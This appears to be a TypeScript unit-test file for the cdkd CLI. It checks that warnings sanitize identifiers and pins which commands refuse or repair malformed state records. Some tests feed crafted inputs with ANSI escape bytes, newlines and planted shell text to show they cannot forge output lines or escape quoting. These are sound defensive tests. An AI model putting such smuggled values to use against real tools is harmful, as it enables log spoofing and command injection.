    // same inputs. That is the assertion that cannot rot: it pins the shared
    // sanitize-then-shell-quote path rather than re-spelling `shellQuote`'s
    // output here, where a hand-written expectation would have to be revised —
    // and could be revised WRONG — every time that helper changes.
    expect(sibling).toContain(command);
    // The planted text never appears unquoted.
    expect(command).not.toContain(`show ${evil} `);
  });

  it('keeps a control-bearing identifier on ONE line, so it cannot forge a row', () => {
    const w = malformedRenderedContainersWarning(
      `Evil${String.fromCharCode(0x1b)}[31m\nStack: Decoy`,
      'us-east-1',
      ['outputs']
    );
    expect(w.split('\n')).toHaveLength(1);
    expect(w).not.toContain(String.fromCharCode(0x1b));
  });

  it('renders an identifier that sanitizes to EMPTY as a placeholder', () => {
    // Never as nothing: an empty argument makes `--stack-region` swallow the
    // next flag, turning the remedy into a differently-broken command.
    //
    // Built from escapes rather than written as literal bytes: a raw control
    // character makes `grep` and `rg` treat the whole file as BINARY and skip
    // it, so every grep-based audit stops seeing this suite. Enforced by
    // `tests/unit/scripts/source-control-bytes.test.ts`, which is what caught
    // the first cut of this case.
    const controlOnly = String.fromCharCode(0x00, 0x01);
    const w = malformedRenderedContainersWarning(controlOnly, 'us-east-1', ['outputs']);
    expect(w).toContain(UNRENDERABLE);
  });

  it('names the containers in the order it was given, quoted', () => {
    const w = malformedRenderedContainersWarning('S', 'us-east-1', CONTAINERS);
    expect(w).toContain(`'outputs', 'skippedOutputs', 'attributes', 'properties'`);
  });

  it('sanitizes a container NAME too, so the closed union is not the only guard', () => {
    // The union is closed at COMPILE time and the sole caller sources its names
    // from a module constant, so nothing can reach this today. That is exactly
    // why it is worth a case: the guarantee would otherwise live in a comment,
    // and the day a caller derives a name from a record the forged element
    // would render verbatim and could forge a line. Cast, because the type is
    // what this case is deliberately reaching around.
    const forged = `x\nStack: Decoy` as RenderedStateContainer;
    const w = malformedRenderedContainersWarning('S', 'us-east-1', [forged]);
    expect(w.split('\n')).toHaveLength(1);
    // The RENDERED token, not just the line count: a sanitizer that returned
    // `''` for everything would satisfy a line-count assertion while naming no
    // container at all (review of go-to-k/cdkd#3190). The newline becomes a
    // space, so the text survives as prose inside its quotes and cannot start a
    // row.
    expect(w).toContain(`'x Stack: Decoy'`);
  });

  it('floors a name that sanitizes to EMPTY and caps a multi-kilobyte one', () => {
    // The two classes `safeIdentifier` closes that a bare sanitizer does not,
    // and the reason the names take that helper rather than `displaySafe`
    // alone: `''` names no container, and an uncapped name pushes the remedy
    // command off the reader's screen. Same casts, same unreachable-today path.
    const empty = malformedRenderedContainersWarning('S', 'us-east-1', [
      String.fromCharCode(0x00, 0x01) as RenderedStateContainer,
    ]);
    expect(empty).toContain(`'${UNRENDERABLE}'`);

    const long = malformedRenderedContainersWarning('S', 'us-east-1', [
      'q'.repeat(5000) as RenderedStateContainer,
    ]);
    expect(long).toContain(`'${'q'.repeat(128)}...'`);
    // The remedy is still on SCREEN after the cap — a DISTANCE, not
    // `endsWith('--json')`, which the template satisfies on every path with or
    // without a cap and would be the tautology this suite just deleted one case
    // over (review of go-to-k/cdkd#3190). Uncapped, the 5000-character name
    // alone pushes the message past this bound.
    expect(long.length).toBeLessThan(1000);
  });
});

/**
 * WHICH helper each call site gets is the whole safety property, and the first
 * round of go-to-k/cdkd#3018 got it wrong in the dangerous direction: it
 * REPAIRED on `cdkd scrub`, whose `saveState` is gated on `recordsChanged > 0`
 * — satisfied by an OUTPUTS change alone — so a record holding
 * `"resources": null` plus a plaintext secret in `outputs` would have been
 * scrubbed and then saved back with a well-formed `resources: {}`. That
 * launders the only signal anything is wrong: the next `cdkd deploy` reads
 * zero resources and re-CREATES the stack, and the next `cdkd destroy` orphans
 * every live resource.
 *
 * So the rule is mechanical — a command that can WRITE state refuses; only a
 * read-only one repairs — and these cases pin each site to the right side of
 * it.
 */
describe('write-capable commands refuse; read-only ones repair', () => {
  const REFUSE = [
    'src/cli/commands/scrub.ts',
    'src/cli/commands/import.ts',
    'src/cli/commands/orphan.ts',
    // Added in round 3: `{...null}` yields `{}` and throws nothing, so this
    // one launders silently — in the command that runs precisely when state is
    // already suspect.
    'src/cli/commands/rollback.ts',
  ];
  const REPAIR = ['src/cli/commands/diff-recursive.ts'];

  /**
   * The FIRST expression in each file that READS the resources bag. The
   * refusal has to come before it.
   *
   * For `import` / `orphan` / `rollback` the anchor is an UNGUARDED read, so
   * a refusal below it leaves the raw TypeError in front of the named one --
   * round 1's exact defect. `scrub`'s anchor carries a `?? {}` and so cannot
   * throw; it is pinned anyway because a refusal below the point the bag is
   * first CONSUMED would let the command act on an empty map before deciding
   * it will not act at all.
   */
  const FIRST_DEREF: Record<string, string> = {
    'src/cli/commands/scrub.ts': 'Object.entries(state.resources',
    'src/cli/commands/import.ts': 'hasOwnProperty.call(existingState.resources',
    'src/cli/commands/orphan.ts': 'id in state.resources',
    'src/cli/commands/rollback.ts': '{ ...baseState.resources }',
  };

  for (const file of REFUSE) {
    it(`${file} REFUSES — it can saveState`, () => {
      const src = code(file);
      // TWO spellings count as refusing. Most files call the shared helper;
      // `scrub` branches on the exported predicate and raises its OWN exit-2
      // class, because its exit 1 is spoken for ("--fail found plaintext").
      // Both must carry the same MESSAGE, which the exit-code case pins.
      const refuses =
        src.includes('refuseMalformedState(') ||
        (src.includes('hasReadableResources(') && src.includes('malformedStateRefusalMessage('));
      expect(
        refuses,
        `${file} calls saveState, so a malformed record must be refused, not repaired: saving ` +
          `over it would replace the evidence with a well-formed empty bag permanently. Call ` +
          `refuseMalformedState(), or branch on hasReadableResources() and raise your own ` +
          `class around malformedStateRefusalMessage().`
      ).toBe(true);
      // `scrub` is the one file legitimately holding BOTH: its write gate is
      // `recordsChanged > 0 && !opts.dryRun`, so under `--dry-run` it provably
      // cannot persist and repairing preserves the audit. Any OTHER
      // write-capable file holding the repair helper is the round-2 defect.
      if (file !== 'src/cli/commands/scrub.ts') {
        expect(
          src.includes('repairMalformedResourcesForReadOnly'),
          `${file} repairs a malformed resources bag but can also WRITE state.`
        ).toBe(false);
      } else {
        // NOT `toContain('!opts.dryRun')`: the doc comment beside the branch
        // quotes that gate verbatim, so the assertion passed on the PROSE —
        // delete the runtime gate, keep the comment, fence stays green. Pin
        // the two things that actually make the exception sound, each as a
        // statement rather than as explanation: the lock is not taken under
        // --dry-run, and the save is gated on it.
        expect(src, 'scrub no longer skips the lock under --dry-run').toMatch(
          /acquired\s*=\s*!opts\.dryRun/
        );
        expect(src, "scrub's saveState is no longer gated on !opts.dryRun").toMatch(
          /recordsChanged > 0 && !opts\.dryRun/
        );
        // And the repair must not be able to end in a clean verdict — the
        // finding has to reach a non-zero exit (go-to-k/cdkd#3018 round 4).
        expect(
          src,
          'a --dry-run that repaired a malformed bag no longer raises; `--dry-run --fail` would ' +
            'report a CI-green clean run over a record whose resources it never read.'
        ).toContain('malformedRecords.length > 0');
      }
      // The premise of the rule, asserted rather than assumed — if this file
      // stops writing state the classification should be revisited, not
      // silently inherited.
      expect(src, `${file} no longer calls saveState`).toContain('saveState(');

      // DOMINANCE, not presence. The round-1 defect WAS a position error -- a
      // guard below the dereference it meant to protect -- so a fence that
      // only checks the refusal exists would not have caught it, and moving
      // any of these calls below its file's first bag dereference reds
      // nothing without this.
      const refusalAt = Math.max(
        src.indexOf('refuseMalformedState('),
        src.indexOf('hasReadableResources(')
      );
      const derefAt = FIRST_DEREF[file]!;
      const derefIndex = src.indexOf(derefAt);
      expect(
        derefIndex,
        `${file} no longer contains its first bag dereference \`${derefAt}\`; this fence's ` +
          `anchor is stale and it is no longer checking dominance.`
      ).toBeGreaterThan(-1);
      expect(
        refusalAt,
        `${file} refuses AFTER its first \`state.resources\` dereference (\`${derefAt}\`), so ` +
          `the raw TypeError still fires one line above the refusal — the exact shape ` +
          `go-to-k/cdkd#3018's first cut shipped.`
      ).toBeLessThan(derefIndex);
    });
  }

  // `diff-recursive.ts` hands the repaired record to `diff.ts`, which is where
  // the top-level command lives. The repair is only safe while NEITHER writes,
  // so the consumer is fenced alongside the producer rather than reasoned about.
  it('src/cli/commands/diff.ts consumes a repaired record and must not write either', () => {
    const src = code('src/cli/commands/diff.ts');
    // A write would arrive through a helper, not necessarily through a literal
    // `saveState(` in this file — so the three helpers that own one are fenced
    // by IMPORT as well.
    for (const writer of ['ExportIndexStore', 'LockManager', 'DeploymentEventsStore']) {
      expect(
        src.includes(writer),
        `src/cli/commands/diff.ts now imports ${writer}, which can persist. It consumes ` +
          `records repaired by diff-recursive.ts, so any write from this file can launder a ` +
          `merely-unreadable record into a well-formed empty one.`
      ).toBe(false);
    }
    expect(
      src.includes('saveState('),
      `src/cli/commands/diff.ts now writes state. It receives records repaired by ` +
        `diff-recursive.ts's loadStateOrEmpty, so writing one back would save a well-formed ` +
        `empty bag over a merely-unreadable record — the laundering go-to-k/cdkd#3018's fix ` +
        `refuses everywhere else.`
    ).toBe(false);
  });

  for (const file of REPAIR) {
    it(`${file} REPAIRS — it never writes`, () => {
      const src = code(file);
      expect(src).toContain('repairMalformedResourcesForReadOnly(');
      expect(src).toContain('malformedResourcesWarning(');
      expect(
        src.includes('saveState('),
        `${file} now writes state, so repairing a malformed bag there can launder the record ` +
          `— it must refuse instead.`
      ).toBe(false);
    });
  }

  /**
   * The `outputs` half (go-to-k/cdkd#3189). Same DOMINANCE shape as the refusal
   * cases above, for the same measured reason: the harm is a guard sitting
   * BELOW the first dereference of the container it guards, and a fence that
   * only checks the call exists stays green through exactly that move.
   */
  it('src/cli/commands/diff-recursive.ts repairs `outputs` BEFORE anything reads it', () => {
    const file = 'src/cli/commands/diff-recursive.ts';
    const src = code(file);
    expect(
      src.includes('repairMalformedOutputsForReadOnly('),
      `${file} no longer repairs a malformed 'outputs' bag at the load, so a hand-edited ` +
        `record whose outputs hold a string previews one phantom REMOVE row per character.`
    ).toBe(true);
    expect(
      src.includes('malformedOutputsWarning('),
      `${file} repairs the 'outputs' bag silently. An empty bag is indistinguishable from a ` +
        `record that exports nothing, so every output reads as an ADD with no sign the record ` +
        `is damaged.`
    ).toBe(true);

    // The first thing in this file that READS the stored bag. It is a LOOKUP,
    // not the walk that fabricates: `resolveTemplateOutputs` receives
    // `currentState.outputs` and asks `hasOwnProperty.call(storedOutputs, key)`
    // of it, which ANSWERS TRUE on a string for `'0'` / `'length'` and THROWS
    // on `null`. A repair below this line leaves both.
    const derefAt = 'currentState.outputs';
    const derefIndex = src.indexOf(derefAt);
    expect(
      derefIndex,
      `${file} no longer contains \`${derefAt}\`; this fence's anchor is stale and it is no ` +
        `longer checking dominance.`
    ).toBeGreaterThan(-1);
    expect(
      src.indexOf('repairMalformedOutputsForReadOnly('),
      `${file} repairs the 'outputs' bag AFTER its first \`${derefAt}\` read, so the stored-key ` +
        `lookups still run against the unrepaired container — the shape go-to-k/cdkd#3018's ` +
        `first cut shipped for the resources bag.`
    ).toBeLessThan(derefIndex);
  });

  /**
   * The `outputs` bag's WRITE-capable half (go-to-k/cdkd#3192) — the same
   * enumeration the `resources` cases above carry, so a new site cannot be
   * added on the wrong side of the refuse-versus-repair rule for one container
   * while satisfying it for the other.
   *
   * The population is the write-capable files that READ or REBUILD the bag,
   * which is NOT the same set as `REFUSE` above. `rollback.ts` is the
   * difference and is excluded deliberately: `grep -n outputs
   * src/cli/commands/rollback.ts` returns NOTHING — it spreads `...baseState`,
   * carrying the field by value — so a guard there would protect nothing, and
   * an unfalsifiable guard fences nothing. The membership case below pins that
   * premise rather than leaving it in a comment.
   */
  const OUTPUTS_REFUSE = [
    'src/cli/commands/scrub.ts',
    'src/cli/commands/import.ts',
    'src/cli/commands/orphan.ts',
  ];

  /**
   * The FIRST expression in each file that reads or carries the `outputs` bag.
   * The refusal has to DOMINATE it — the round-1 defect of go-to-k/cdkd#3018
   * was a guard sitting below the dereference it meant to protect, and a fence
   * that only checks the call exists stays green through exactly that move.
   */
  const FIRST_OUTPUTS_USE: Record<string, string> = {
    // The `isOutputSuppressed(...)` read in the Export.Name resolve loop —
    // TIGHTENED from `Object.keys(state.outputs` (review of
    // go-to-k/cdkd#3206), which sits ~5,500 stripped characters LATER, so a
    // guard moved between the two would have kept this fence green while the
    // bag was already read. Both are inside `scrubStack`; the earlier one is
    // the dominance question.
    'src/cli/commands/scrub.ts': 'state.outputs ?? {}',
    // The state literal that carries the bag into `saveState`.
    'src/cli/commands/import.ts': 'existingState?.outputs',
    // `rewriteResourceReferences`, which rebuilds the bag from
    // `Object.entries(state.outputs ?? {})` in `src/analyzer/orphan-rewriter.ts`.
    'src/cli/commands/orphan.ts': 'rewriteResourceReferences(',
  };

  it('rollback.ts is OUT of the outputs population because it reads no outputs', () => {
    // The premise of the exclusion, asserted rather than assumed. If this file
    // ever starts reading or rebuilding the bag, it joins `OUTPUTS_REFUSE` —
    // it already calls `saveState`, so the refuse side is settled for it.
    const src = code('src/cli/commands/rollback.ts');
    expect(
      src.includes('.outputs'),
      'src/cli/commands/rollback.ts now reads `outputs`. It calls saveState, so it must refuse a ' +
        'malformed bag: add it to OUTPUTS_REFUSE with its first dereference as the anchor.'
    ).toBe(false);
    expect(src, 'rollback.ts no longer calls saveState').toContain('saveState(');
  });

  for (const file of OUTPUTS_REFUSE) {
    it(`${file} REFUSES a malformed \`outputs\` bag — it can saveState`, () => {
      const src = code(file);
      // TWO spellings, exactly as the resources half: most files call the
      // shared helper; `scrub` branches on the exported predicate and raises
      // its OWN exit-2 class, because its exit 1 is spoken for.
      const refuses =
        src.includes('refuseMalformedOutputs(') ||
        (src.includes('hasReadableOutputs(') && src.includes('malformedOutputsRefusalMessage('));
      expect(
        refuses,
        `${file} calls saveState and reads the outputs bag, so a malformed one must be REFUSED, ` +
          `not repaired: this command rebuilds the bag before saving, so a string is written ` +
          `back as a well-formed map and the damaged record is laundered permanently. Call ` +
          `refuseMalformedOutputs(), or branch on hasReadableOutputs() and raise your own class ` +
          `around malformedOutputsRefusalMessage().`
      ).toBe(true);

      // Only `scrub` may ALSO hold the repair helper, and only because its
      // write gate proves `--dry-run` cannot persist. The same carve-out, and
      // the same reason, as the resources half one describe up.
      if (file !== 'src/cli/commands/scrub.ts') {
        expect(
          src.includes('repairMalformedOutputsForReadOnly'),
          `${file} repairs a malformed outputs bag but can also WRITE state.`
        ).toBe(false);
      } else {
        // The repair must not be able to end in a CLEAN verdict: the finding
        // has to reach a non-zero exit, or `--dry-run --fail` reports a stack
        // clean whose stored outputs it never read.
        expect(
          src,
          'scrub no longer carries the outputs repair out to its caller; `--dry-run --fail` ' +
            'would exit 0 over a record whose outputs it replaced with {}.'
        ).toContain('malformedOutputs');
        expect(
          src,
          'the outputs finding no longer reaches the audited-record refusal.'
        ).toContain('malformedOutputRecords.length > 0');
      }

      expect(src, `${file} no longer calls saveState`).toContain('saveState(');

      // DOMINANCE.
      const refusalAt = Math.max(
        src.indexOf('refuseMalformedOutputs('),
        src.indexOf('hasReadableOutputs(')
      );
      const derefAt = FIRST_OUTPUTS_USE[file]!;
      const derefIndex = src.indexOf(derefAt);
      expect(
        derefIndex,
        `${file} no longer contains its first outputs use \`${derefAt}\`; this fence's anchor ` +
          `is stale and it is no longer checking dominance.`
      ).toBeGreaterThan(-1);
      expect(
        refusalAt,
        `${file} refuses AFTER its first \`outputs\` use (\`${derefAt}\`), so the bag is already ` +
          `read — or rebuilt — one line above the refusal.`
      ).toBeLessThan(derefIndex);
    });
  }

  /**
   * The exports index takes NEITHER answer, and the third disposition is the
   * per-site decision go-to-k/cdkd#3192 exists to make rather than an omission.
   */
  it('src/state/export-index-store.ts fails CLOSED and SAYS so, refusing nothing', () => {
    const src = code('src/state/export-index-store.ts');
    expect(
      src.includes('hasReadableExportSet('),
      `the exports-index rebuild no longer tests the producer record's export set, so a ` +
        `hand-edited one publishes a fabricated export per character into the shared index.`
    ).toBe(true);
    expect(
      src.includes('malformedExportSourceWarning('),
      `the exports-index rebuild drops a damaged producer SILENTLY. An empty contribution is ` +
        `indistinguishable from a stack that exports nothing, so the next Fn::ImportValue miss ` +
        `names the CONSUMER and nothing ever names this record.`
    ).toBe(true);
    // And it must NOT refuse: this rebuild serves every producer in the region.
    expect(
      src.includes('refuseMalformedOutputs('),
      `the exports-index rebuild now REFUSES on a malformed record, which takes every other ` +
        `stack's Fn::ImportValue resolution down with it.`
    ).toBe(false);
  });

  /**
   * The second line of defence, and the reason it is not a substitute for the
   * one above: `computeOutputsDiff` is the WALK, and a walk-site guard cannot
   * see the lookups its caller already made.
   */
  it('src/analyzer/outputs-diff.ts admits the stored bag through the SHARED predicate', () => {
    const src = code('src/analyzer/outputs-diff.ts');
    const at = src.indexOf('export function computeOutputsDiff');
    expect(at, 'computeOutputsDiff was renamed; this fence reads its body').toBeGreaterThan(-1);
    // BOUNDED at the next top-level export, not sliced to EOF. The function is
    // the last export today, so an unbounded slice has an empty blind spot —
    // but appending anything after it would let a REVERTED computeOutputsDiff
    // satisfy the check below out of the new function's body (review of
    // go-to-k/cdkd#3194).
    const next = src.indexOf('\nexport ', at + 1);
    const body = next === -1 ? src.slice(at) : src.slice(at, next);
    expect(
      /isReadableBag\(\s*current\s*\)/.test(body),
      `computeOutputsDiff no longer tests the stored bag with isReadableBag. A bare \`?? {}\` ` +
        `covers null and undefined only, so a string or a list is enumerated and fabricates one ` +
        `REMOVE row per character or element (go-to-k/cdkd#3189).`
    ).toBe(true);
    // The exact spelling this replaced, refused by name: it reads as a guard,
    // admits every non-nullish shape, and is what shipped the defect.
    expect(
      /currentBag\s*=\s*current\s*\?\?/.test(body),
      `computeOutputsDiff is back to \`current ?? {}\` for the stored bag.`
    ).toBe(false);
    // And through the SHARED predicate, not a second spelling of it beside the
    // one `isReadableBag`'s export note exists to keep singular.
    expect(
      src.includes(`from '../state/malformed-resources-bag.js'`),
      `src/analyzer/outputs-diff.ts no longer imports the shared predicate.`
    ).toBe(true);
  });
});
